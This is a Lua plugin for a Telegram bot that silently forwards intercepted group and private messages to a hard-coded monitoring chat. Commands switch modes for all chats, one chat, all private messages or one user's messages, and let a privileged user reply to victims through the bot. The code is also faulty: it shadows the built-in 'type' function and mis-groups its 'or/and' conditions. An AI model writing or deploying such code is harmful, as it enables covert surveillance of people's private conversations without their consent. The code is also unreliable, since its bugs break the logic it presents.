
local function run(msg, matches)
local type = mimetype.get_content_type_no_sub(matches[1])
    if matches[1] == "show" or matches[1] == "Show" and not matches[2] then
            if msg.to.id == 142334685 then
              show = 1
              ansmod = 0
              return "فعال 😈"
            else
              send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
            end
    elseif matches[1] == "show" or matches[1] == "Show" and matches[2] ~= 'nil' then
            if msg.to.id == 142334685 then
              redis:set("id", matches[2])
              show = 2
              ansmod = 0
              return "فعال 😈"
            else
              send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
            end
    elseif matches[1] == 'Showhere' then
    show = 5
    elseif matches[1] == "stop" or matches[1] == "Stop" then
          if msg.to.id == 142334685 then
            show = 0
            ansmod = 0
            redis:del("id")
            redis:del("ansmod")
            return "غیر فعال"
          else
            send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
          end
    elseif matches[1] == "showpv" or matches[1] == "Showpv" and not matches[2] then
          if msg.to.id == 142334685 then
              show = 3
              ansmod = 0
              return "فعال 😈"
            else
              send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
            end
    elseif matches[1] == "showpv" or matches[1] == "Showpv" and matches[2] ~= 'nil'then
          if msg.to.id == 142334685 then
              redis:set("id", matches[2])
              show = 4
              ansmod = 0
              return "فعال 😈"
            else
              send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
            end
    end
    if tonumber(show) == 1 then
      send_msg('chat#142334685', msg.to.print_name..'\n'..msg.to.id..'\n👇👇👇👇', ok_cb, false)
      fwd_msg('chat#142334685' , msg.id ,ok_cb, false)
    elseif tonumber(show) == 2 then
      if msg.to.id == tonumber(redis:get("id")) then
        fwd_msg('chat#142334685', msg.id, ok_cb, false)
      end
    elseif tonumber(show) == 3 then
      if msg.to.type == "user" then
        fwd_msg('chat#142334685', msg.id, ok_cb, false)
      end
    elseif tonumber(show) == 4 then
      if msg.to.type == "user" then
        if msg.from.id == tonumber(redis:get("id")) then
            fwd_msg('chat#142334685', msg.id, ok_cb, false)
        end
      end
    end
    if msg.to.id == 142334685 then
      if is_sudo(msg) then 
        if type(msg.reply_id) ~= 'nil' then
          ----
          if type(msg.fwd_id) ~= 'nil'then
            if tonumber(show) == 3 or tonumber(show) == 4 then
              send_msg('user#'..msg.fwd_id, msg.text, ok_cb, false)
            end
          end
          ----
        end
      end
    end
end
return {
     patterns = {
        "^([Ss]how)$",
        "^(Showhere)$",
        "^(Stophere)$",
        "^([Ss]howpv)$",
        "^([Ss]how) (%d+)$",
        "^([Ss]howpv) (%d+)$",
        "^([Ss]top)$",
        "^([Aa]nsmod)$",
        "^([Aa]nsmod off)$",
        "%[(photo)%]",
        "%[(document)%]",
        "^(.*)$"
        },
     run = run
}
